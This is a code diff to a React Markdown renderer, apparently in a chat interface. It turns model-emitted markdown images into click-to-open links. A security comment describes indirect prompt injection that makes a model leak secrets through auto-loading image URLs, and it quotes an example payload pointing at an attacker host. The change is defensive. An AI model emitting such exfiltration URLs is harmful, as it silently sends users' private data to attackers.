@@ -194,9 +194,36 @@ export const Markdown = memo(function Markdown({
       return <CodeBlock {...props} />;
     };
 
-    if (citationCount <= 0) return { pre };
+    // SECURITY (PI-001 提示注入·渲染侧外泄): downgrade every model-emitted markdown
+    // image to a click-to-open link — never an auto-loading <img>. ReactMarkdown maps
+    // `![](url)` to this component, and no rehype-raw is loaded, so raw <img> HTML in
+    // the reply is inert text — this is the ONLY path that can create an image element.
+    // Without it, an indirect-injection payload like `![](http://attacker/?d=<secret>)`
+    // would fetch on render = a no-click, silent exfil beacon for anything the model was
+    // induced to encode in the URL. As a link, egress needs an explicit user click (the
+    // same bar as any model-emitted link). Citation favicons go through <Favicon> /
+    // <ChipFavicon> (backend proxy, a separate trusted path), so they're unaffected.
+    const img = ({ src, alt }: ComponentPropsWithoutRef<"img">) => {
+      const href = typeof src === "string" ? src : undefined;
+      const label =
+        typeof alt === "string" && alt.trim() ? alt.trim() : "图片链接";
+      if (!href) return <>{label}</>;
+      return (
+        <a
+          href={href}
+          target="_blank"
+          rel="noreferrer"
+          className="text-primary underline underline-offset-2"
+        >
+          {label}
+        </a>
+      );
+    };
+
+    if (citationCount <= 0) return { pre, img };
     return {
       pre,
+      img,
       a({ href, children, node: _node, ...props }) {
         const m = typeof href === "string" ? /^cite:(\d+)$/.exec(href) : null;
         if (m) {
